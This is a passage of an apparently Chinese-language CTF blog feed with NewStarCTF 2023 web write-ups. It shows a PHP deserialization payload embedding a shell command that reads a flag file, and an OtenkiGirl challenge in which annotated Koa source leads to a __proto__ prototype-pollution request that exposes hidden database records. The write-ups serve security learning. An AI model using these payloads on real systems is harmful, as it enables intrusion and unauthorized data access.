txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">$payload=&quot;tac /flag_is_h3eeere | sed &#x27;1,20w test&#x27;&quot;;<br><br>POST:<br>payload=O:7:&quot;minipop&quot;:2:&#123;s:4:&quot;code&quot;;s:39:&quot;tac /flag_is_h3eeere | sed &#x27;1,20w test&#x27;&quot;;s:13:&quot;qwejaskdjnlka&quot;;O:7:&quot;minipop&quot;:2:&#123;s:4:&quot;code&quot;;s:39:&quot;tac /flag_is_h3eeere | sed &#x27;1,20w test&#x27;&quot;;s:13:&quot;qwejaskdjnlka&quot;;N;&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-11-3-newstar-3/image-20231013111032145.png" alt="image-20231013111032145"></p><h2 id="OtenkiGirl"><a href="#OtenkiGirl" class="headerlink" title="OtenkiGirl"></a>OtenkiGirl</h2><p>该题提供了网页的源码，我们可以从网页的源码中进行分析:<br><img src="/images/2023-11-3-newstar-3/image-20231028152657729.png" alt="image-20231028152657729"></p><p>源码中存在路由文件夹，先查看网页的具体运行逻辑是什么，即从网页的路由开始分析:</p><p>submit.js:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-title class_">Router</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;koa-router&quot;</span>);<br><span class="hljs-keyword">const</span> router = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Router</span>();<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">SQL</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;./sql&quot;</span>);<br><span class="hljs-keyword">const</span> sql = <span class="hljs-keyword">new</span> <span class="hljs-title function_">SQL</span>(<span class="hljs-string">&quot;wishes&quot;</span>);<br><span class="hljs-keyword">const</span> <span class="hljs-title class_">Base58</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;base-58&quot;</span>);<br><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">ALPHABET</span> = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span>;<br><span class="hljs-keyword">const</span> <span class="hljs-title function_">rndText</span> = (<span class="hljs-params">length</span>) =&gt; &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>(&#123; length &#125;, <span class="hljs-function">() =&gt;</span> <span class="hljs-variable constant_">ALPHABET</span>[<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-variable constant_">ALPHABET</span>.<span class="hljs-property">length</span>)]).<span class="hljs-title function_">join</span>(<span class="hljs-string">&#x27;&#x27;</span>);<br>&#125;<br><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">timeText</span> = (<span class="hljs-params">timestamp</span>) =&gt; &#123;<br>    timestamp = (<span class="hljs-keyword">typeof</span> timestamp === <span class="hljs-string">&quot;number&quot;</span> ? timestamp : <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>()).<span class="hljs-title function_">toString</span>();<br>    <span class="hljs-keyword">let</span> text1 = timestamp.<span class="hljs-title function_">substring</span>(<span class="hljs-number">0</span>, timestamp.<span class="hljs-property">length</span> / <span class="hljs-number">2</span>);<br>    <span class="hljs-keyword">let</span> text2 = timestamp.<span class="hljs-title function_">substring</span>(timestamp.<span class="hljs-property">length</span> / <span class="hljs-number">2</span>)<br>    <span class="hljs-keyword">let</span> text = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; text1.<span class="hljs-property">length</span>; i++)<br>        text += text1[i] + text2[text2.<span class="hljs-property">length</span> - <span class="hljs-number">1</span> - i];<br>    <span class="hljs-keyword">if</span> (text2.<span class="hljs-property">length</span> &gt; text1.<span class="hljs-property">length</span>) text += text2[<span class="hljs-number">0</span>];<br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Base58</span>.<span class="hljs-title function_">encode</span>(<span class="hljs-title function_">rndText</span>(<span class="hljs-number">3</span>) + <span class="hljs-title class_">Buffer</span>.<span class="hljs-title function_">from</span>(text)); <span class="hljs-comment">// length = 20</span><br>&#125;<br><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">rndID</span> = (<span class="hljs-params">length, timestamp</span>) =&gt; &#123;<br>    <span class="hljs-keyword">const</span> t = <span class="hljs-title function_">timeText</span>(timestamp);<br>    <span class="hljs-keyword">if</span> (length &lt; t.<span class="hljs-property">length</span>) <span class="hljs-keyword">return</span> t.<span class="hljs-title function_">substring</span>(<span class="hljs-number">0</span>, length);<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> t + <span class="hljs-title function_">rndText</span>(length - t.<span class="hljs-property">length</span>);<br>&#125;<br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">insert2db</span>(<span class="hljs-params">data</span>) &#123;<br>    <span class="hljs-keyword">let</span> date = <span class="hljs-title class_">String</span>(data[<span class="hljs-string">&quot;date&quot;</span>]),<br>        place = <span class="hljs-title class_">String</span>(data[<span class="hljs-string">&quot;place&quot;</span>]),<br>        contact = <span class="hljs-title class_">String</span>(data[<span class="hljs-string">&quot;contact&quot;</span>]),<br>        reason = <span class="hljs-title class_">String</span>(data[<span class="hljs-string">&quot;reason&quot;</span>]);<br>    <span class="hljs-keyword">const</span> timestamp = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>();<br>    <span class="hljs-keyword">const</span> wishid = <span class="hljs-title function_">rndID</span>(<span class="hljs-number">24</span>, timestamp);<br>    <span class="hljs-comment">//将用户输入的内容插入数据库中</span><br>    <span class="hljs-keyword">await</span> sql.<span class="hljs-title function_">run</span>(<span class="hljs-string">`INSERT INTO wishes (wishid, date, place, contact, reason, timestamp) VALUES (?, ?, ?, ?, ?, ?)`</span>, [wishid, date, place, contact, reason, timestamp]).<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> &#123; <span class="hljs-keyword">throw</span> e &#125;);<br>    <span class="hljs-keyword">return</span> &#123; wishid, date, place, contact, reason, timestamp &#125;<br>&#125;<br><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">merge</span> = (<span class="hljs-params">dst, src</span>) =&gt; &#123;<br>    <span class="hljs-comment">//在js中如果对象时json类型即const data=&#123;&#125;,则该data对象的类型就为object，否则就不是，返回dst所代表的值</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> dst !== <span class="hljs-string">&quot;object&quot;</span> || <span class="hljs-keyword">typeof</span> src !== <span class="hljs-string">&quot;object&quot;</span>) <span class="hljs-keyword">return</span> dst;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> src) &#123; <span class="hljs-comment">//获取src中的键</span><br>        <span class="hljs-keyword">if</span> (key <span class="hljs-keyword">in</span> dst &amp;&amp; key <span class="hljs-keyword">in</span> src) &#123; <span class="hljs-comment">//如果键存在于两个对象中则进行合并</span><br>            <span class="hljs-comment">//将两个对象所对应的key的value进行合并，返回给dst对象</span><br>            dst[key] = <span class="hljs-title function_">merge</span>(dst[key], src[key]);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">//如果dst对象中不存在该键值，则添加上该键值</span><br>            dst[key] = src[key];<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//所以最终该代码添加上dst中没有src中有的键值内容给dst,保持两者都有的内容在dst中不变</span><br>    <span class="hljs-keyword">return</span> dst;<br>&#125;<br><br><span class="hljs-comment">//网页以post请求的方式访问/submit地址时,atx存储了请求和响应的信息</span><br>router.<span class="hljs-title function_">post</span>(<span class="hljs-string">&quot;/submit&quot;</span>, <span class="hljs-title function_">async</span>(ctx) =&gt; &#123;<br>    <span class="hljs-comment">//判断，传输类型是否是application/json</span><br>    <span class="hljs-keyword">if</span> (ctx.<span class="hljs-property">header</span>[<span class="hljs-string">&quot;content-type&quot;</span>] !== <span class="hljs-string">&quot;application/json&quot;</span>)<br>    <span class="hljs-comment">//返回一个以json数据为格式的响应内容</span><br>        <span class="hljs-keyword">return</span> ctx.<span class="hljs-property">body</span> = &#123;<br>            <span class="hljs-attr">status</span>: <span class="hljs-string">&quot;error&quot;</span>,<br>            <span class="hljs-attr">msg</span>: <span class="hljs-string">&quot;Content-Type must be application/json&quot;</span><br>        &#125;<br>        <span class="hljs-comment">//获取请求体中的json主体内容</span><br>    <span class="hljs-keyword">const</span> jsonText = ctx.<span class="hljs-property">request</span>.<span class="hljs-property">rawBody</span> || <span class="hljs-string">&quot;&#123;&#125;&quot;</span><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-comment">//将获取的数据转化为js所可以使用的json数据，可以理解为转化为字典类型的数据</span><br>        <span class="hljs-keyword">const</span> data = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(jsonText);<br>        <span class="hljs-comment">//判断json数据data中contact健所对应的value的类型以及reason所对应得类型是不是为string(字符串)</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> data[<span class="hljs-string">&quot;contact&quot;</span>] !== <span class="hljs-string">&quot;string&quot;</span> || <span class="hljs-keyword">typeof</span> data[<span class="hljs-string">&quot;reason&quot;</span>] !== <span class="hljs-string">&quot;string&quot;</span>)<br>        <span class="hljs-comment">//如果其中有一个传输类型不是字符串就输出错误的响应包</span><br>            <span class="hljs-keyword">return</span> ctx.<span class="hljs-property">body</span> = &#123;<br>                <span class="hljs-attr">status</span>: <span class="hljs-string">&quot;error&quot;</span>,<br>                <span class="hljs-attr">msg</span>: <span class="hljs-string">&quot;Invalid parameter&quot;</span><br>            &#125;<br>            <span class="hljs-comment">//判断data中contact和reason所对应的内容的值是否为空</span><br>        <span class="hljs-keyword">if</span> (data[<span class="hljs-string">&quot;contact&quot;</span>].<span class="hljs-property">length</span> &lt;= <span class="hljs-number">0</span> || data[<span class="hljs-string">&quot;reason&quot;</span>].<span class="hljs-property">length</span> &lt;= <span class="hljs-number">0</span>)<br>        <span class="hljs-comment">//如果两者所对应得内容为空，则返回错误得响应内容主体</span><br>            <span class="hljs-keyword">return</span> ctx.<span class="hljs-property">body</span> = &#123;<br>            <span class="hljs-attr">status</span>: <span class="hljs-string">&quot;error&quot;</span>,<br>            <span class="hljs-attr">msg</span>: <span class="hljs-string">&quot;Parameters contact and reason cannot be empty&quot;</span><br>        &#125;<br><br>        <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">DEFAULT</span> = &#123;<br>                <span class="hljs-attr">date</span>: <span class="hljs-string">&quot;unknown&quot;</span>,<br>                <span class="hljs-attr">place</span>: <span class="hljs-string">&quot;unknown&quot;</span><br>            &#125;<br>            <span class="hljs-comment">//调用insert2db函数将内容插入到数据库中</span><br>        <span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> <span class="hljs-title function_">insert2db</span>(<span class="hljs-title function_">merge</span>(<span class="hljs-variable constant_">DEFAULT</span>, data));<br>        ctx.<span class="hljs-property">body</span> = &#123;<br>            <span class="hljs-attr">status</span>: <span class="hljs-string">&quot;success&quot;</span>,<br>            <span class="hljs-attr">data</span>: result<br>        &#125;;<br>    &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(e);<br>        ctx.<span class="hljs-property">body</span> = &#123;<br>            <span class="hljs-attr">status</span>: <span class="hljs-string">&quot;error&quot;</span>,<br>            <span class="hljs-attr">msg</span>: <span class="hljs-string">&quot;Internal Server Error&quot;</span><br>        &#125;<br>    &#125;<br>&#125;)<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = router;<br></code></pre></td></tr></table></figure><p>info.js:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-title class_">Router</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;koa-router&quot;</span>);<br><span class="hljs-keyword">const</span> router = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Router</span>();<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">SQL</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;./sql&quot;</span>);<br><span class="hljs-keyword">const</span> sql = <span class="hljs-keyword">new</span> <span class="hljs-title function_">SQL</span>(<span class="hljs-string">&quot;wishes&quot;</span>);<br><span class="hljs-comment">//引用配置文件，可以使当前代码获取引用文件中的信息</span><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">CONFIG</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;../config&quot;</span>)<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">DEFAULT_CONFIG</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;../config.default&quot;</span>)<br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">getInfo</span>(<span class="hljs-params">timestamp</span>) &#123;<br>    <span class="hljs-comment">//如果timestamp类型为number型（数值型），则返回timestamp的值，否则就为当前时间的值</span><br>    timestamp = <span class="hljs-keyword">typeof</span> timestamp === <span class="hljs-string">&quot;number&quot;</span> ? timestamp : <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>();<br>    <span class="hljs-comment">// Remove test data from before the movie was released</span><br>    <span class="hljs-comment">//获取时间戳信息，如果CONFIG.min_public_time的时间为真则以它作为对象申请时的参数</span><br>    <span class="hljs-comment">//否则就以DEFAULT_CONFIG.min_public_time作为时间对象的参数，gettime()获取date类的时间戳</span><br>    <span class="hljs-comment">//这里的CONFIG，DEFAULT_CONFIG都属于引用文件，所以获取的是引用的配置文件中的信息</span><br>    <span class="hljs-keyword">let</span> minTimestamp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(<span class="hljs-variable constant_">CONFIG</span>.<span class="hljs-property">min_public_time</span> || <span class="hljs-variable constant_">DEFAULT_CONFIG</span>.<span class="hljs-property">min_public_time</span>).<span class="hljs-title function_">getTime</span>();<br>    <span class="hljs-comment">//timestamp获取timestamp和minTimestamp中最大的那一个时间戳的值</span><br>    timestamp = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(timestamp, minTimestamp);<br>    <span class="hljs-comment">//获取数据库中时间戳大于timestamp的记录内容</span><br>    <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> sql.<span class="hljs-title function_">all</span>(<span class="hljs-string">`SELECT wishid, date, place, contact, reason, timestamp FROM wishes WHERE timestamp &gt;= ?`</span>, [timestamp]).<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> &#123; <span class="hljs-keyword">throw</span> e &#125;);<br>    <span class="hljs-keyword">return</span> data;<br>&#125;<br><span class="hljs-comment">//使用post请求访问/info网页，:表示访问该网页时获取参数内容,ts为参数部分，?表示该参数可以填写也可以不填写</span><br>router.<span class="hljs-title function_">post</span>(<span class="hljs-string">&quot;/info/:ts?&quot;</span>, <span class="hljs-title function_">async</span>(ctx) =&gt; &#123;<br>    <span class="hljs-comment">//判断请求内容得类型是不是application/x-www-form-urlencoded</span><br>    <span class="hljs-keyword">if</span> (ctx.<span class="hljs-property">header</span>[<span class="hljs-string">&quot;content-type&quot;</span>] !== <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>)<br>        <span class="hljs-keyword">return</span> ctx.<span class="hljs-property">body</span> = &#123;<br>                <span class="hljs-attr">status</span>: <span class="hljs-string">&quot;error&quot;</span>,<br>                <span class="hljs-attr">msg</span>: <span class="hljs-string">&quot;Content-Type must be application/x-www-form-urlencoded&quot;</span><br>            &#125;<br>            <span class="hljs-comment">//获取请求内容中的参数集中的参数ts的值的类型</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> ctx.<span class="hljs-property">params</span>.<span class="hljs-property">ts</span> === <span class="hljs-string">&quot;undefined&quot;</span>)<br>        ctx.<span class="hljs-property">params</span>.<span class="hljs-property">ts</span> = <span class="hljs-number">0</span> <span class="hljs-comment">//ts参数默认是0</span><br>        <span class="hljs-comment">// /^[0-9]+$/.test(ctx.params.ts || &quot;&quot;):先运行test()中的内容，如果ts为空则被赋值为&quot;&quot;,同时判断是否由数字组成</span><br>        <span class="hljs-comment">//如果由数字组成的字符串则返回Number(ctx.params.ts)，将ts转化为数值型的结果</span><br>        <span class="hljs-comment">//如果不是由数字组成的字符串，则返回原来ts的内容</span><br>    <span class="hljs-keyword">const</span> timestamp = <span class="hljs-regexp">/^[0-9]+$/</span>.<span class="hljs-title function_">test</span>(ctx.<span class="hljs-property">params</span>.<span class="hljs-property">ts</span> || <span class="hljs-string">&quot;&quot;</span>) ? <span class="hljs-title class_">Number</span>(ctx.<span class="hljs-property">params</span>.<span class="hljs-property">ts</span>) : ctx.<span class="hljs-property">params</span>.<span class="hljs-property">ts</span>;<br>    <span class="hljs-comment">//如果timestamp类型不为数值型</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> timestamp !== <span class="hljs-string">&quot;number&quot;</span>)<br>        <span class="hljs-keyword">return</span> ctx.<span class="hljs-property">body</span> = &#123;<br>            <span class="hljs-attr">status</span>: <span class="hljs-string">&quot;error&quot;</span>,<br>            <span class="hljs-attr">msg</span>: <span class="hljs-string">&quot;Invalid parameter ts&quot;</span><br>        &#125;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> <span class="hljs-title function_">getInfo</span>(timestamp).<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> &#123; <span class="hljs-keyword">throw</span> e &#125;);<br>        ctx.<span class="hljs-property">body</span> = &#123;<br>            <span class="hljs-attr">status</span>: <span class="hljs-string">&quot;success&quot;</span>,<br>            <span class="hljs-comment">//data为从数据库中返回的所有记录数内容</span><br>            <span class="hljs-attr">data</span>: data<br>        &#125;<br>    &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(e);<br>        <span class="hljs-keyword">return</span> ctx.<span class="hljs-property">body</span> = &#123;<br>            <span class="hljs-attr">status</span>: <span class="hljs-string">&quot;error&quot;</span>,<br>            <span class="hljs-attr">msg</span>: <span class="hljs-string">&quot;Internal Server Error&quot;</span><br>        &#125;<br>    &#125;<br>&#125;)<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = router;<br></code></pre></td></tr></table></figure><p>根据info.js的代码审计我们需要查看config.js文件和config.default.js文件中的最小时间信息:</p><p>config.js:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>    <span class="hljs-attr">app_name</span>: <span class="hljs-string">&quot;OtenkiGirl&quot;</span>,<br>    <span class="hljs-attr">default_lang</span>: <span class="hljs-string">&quot;ja&quot;</span>,<br>&#125;<br></code></pre></td></tr></table></figure><p>config.default.js:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>    <span class="hljs-attr">app_name</span>: <span class="hljs-string">&quot;OtenkiGirl&quot;</span>,<br>    <span class="hljs-attr">default_lang</span>: <span class="hljs-string">&quot;ja&quot;</span>,<br>    <span class="hljs-comment">//设置了min_public_time参数的内容</span><br>    <span class="hljs-attr">min_public_time</span>: <span class="hljs-string">&quot;2019-07-09&quot;</span>,<br>    <span class="hljs-attr">server_port</span>: <span class="hljs-number">9960</span>,<br>    <span class="hljs-attr">webpack_dev_port</span>: <span class="hljs-number">9970</span><br>&#125;<br></code></pre></td></tr></table></figure><p>发现只有config.default.js设置了min_public_time参数的内容，所以date类申请时使用了config.default.js中的min_public_time: “2019-07-09”</p><p>同时根据分析info.js我们可以知道我们输入的参数ts可以时任意的，用于获取指定时间戳的信息:</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">/info/1<br></code></pre></td></tr></table></figure><p><img src="/images/2023-11-3-newstar-3/image-20231028170204727.png" alt="image-20231028170204727"></p><p>我们发现返回的内容是时间戳”timestamp”:1698483502171的内容，这是因为我们输入的时间戳ts&#x3D;1&lt;1698483502171（min_public_time: “2019-07-09”）所以返回的是系统默认时间之上的信息</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">/info/1698483502172<br></code></pre></td></tr></table></figure><p><img src="/images/2023-11-3-newstar-3/image-20231028170420211.png" alt="image-20231028170420211"></p><p>发现没有data数据返回，这是因为我们输入的时间戳ts已经大于系统默认的时间戳，所以返回我们ts之上的data数据记录</p><p>猜测:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">当前数据库返回的内容是在系统配置的默认时间之上的信息，即由于代码的时间过滤，最多回显配置时间之上的信息，我们无法查看配置时间之下的数据库中的信息，也许flag就在配置时间之下的记录中，所以我们需要更改默认配置的时间，使其变得很小，这样我们就可以查看数据库中更多的信息<br></code></pre></td></tr></table></figure><p>js原型链污染:</p><p>payload:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable constant_">POST</span> /submit <span class="hljs-variable constant_">HTTP</span>/<span class="hljs-number">1.</span>1Content-<span class="hljs-title class_">Type</span>: application/json<br><br>&#123;  <br>    <span class="hljs-string">&quot;contact&quot;</span>: <span class="hljs-string">&quot;test&quot;</span>,  <br>    <span class="hljs-string">&quot;reason&quot;</span>: <span class="hljs-string">&quot;test&quot;</span>,  <br>    <span class="hljs-string">&quot;__proto__&quot;</span>: &#123;    <br>        <span class="hljs-string">&quot;min_public_time&quot;</span>: <span class="hljs-string">&quot;1001-01-01&quot;</span>  <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-11-3-newstar-3/image-20231028171513867.png" alt="image-20231028171513867"></p><p>获取我们修改默认配置时间后数据库中的信息(0是最小的时间戳，所以一定能返回”min_public_time”: “1001-01-01”之上时间的信息):<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">/info/0<br><br>Content-Type:  application/x-www-form-urlencoded<br></code></pre></td></tr></table></figure><p><img src="/images/2023-11-3-newstar-3/image-20231028171757647.png" alt="image-20231028171757647"></p><p>返回了数据库中更多的信息，在这些额外的信息中查找flag:<br><img src="/images/2023-11-3-newstar-3/image-20231028171854336.png" alt="image-20231028171854336"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>NewStarCTF 2023_第二周WP</title>
    <link href="/2023/10/09/2023-10-9-newstarweek2/"/>
    <url>/2023/10/09/2023-10-9-newstarweek2/</url>
    
    <content type="html"><![CDATA[<h1 id="NewStarCTF-2023-第二周WP"><a href="#NewStarCTF-2023-第二周WP" class="headerlink" title="NewStarCTF 2023_第二周WP"></a>NewStarCTF 2023_第二周WP</h1><h2 id="游戏高手"><a href="#游戏高手" class="headerlink" title="游戏高手"></a>游戏高手</h2><p><img src="/images/2023-10-9-Newstar-2/image-20231004153201791.png" alt="image-20231004153201791"></p><p>本题是一道游戏题，按照惯例，我们需要先查看的js:<br><img src="/images/2023-10-9-Newstar-2/image-20231004153237481.png" alt="image-20231004153237481"></p><p>得到一个app_v2.js文件，以及我们需要获得100000分才能显示flag</p><p>访问app_v2.js文件,我们直接定位到游戏结束时的处理代码:<br><img src="/images/2023-10-9-Newstar-2/image-20231004153442164.png" alt="image-20231004153442164"></p><p>显示一个alert提示框，使用ctrl+f寻找该提示框的具体位置:<br><img src="/images/2023-10-9-Newstar-2/image-20231004153543915.png" alt="image-20231004153543915"></p><p>在该代码中我们发现了api.php文件，对其进行访问:</p><p><img src="/images/2023-10-9-Newstar-2/image-20231004153645105.png" alt="image-20231004153645105"></p><p>对js代码进行代码审计:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//游戏结束</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">gameover</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">if</span>(gameScore &gt; <span class="hljs-number">100000</span>)&#123;<br>        <span 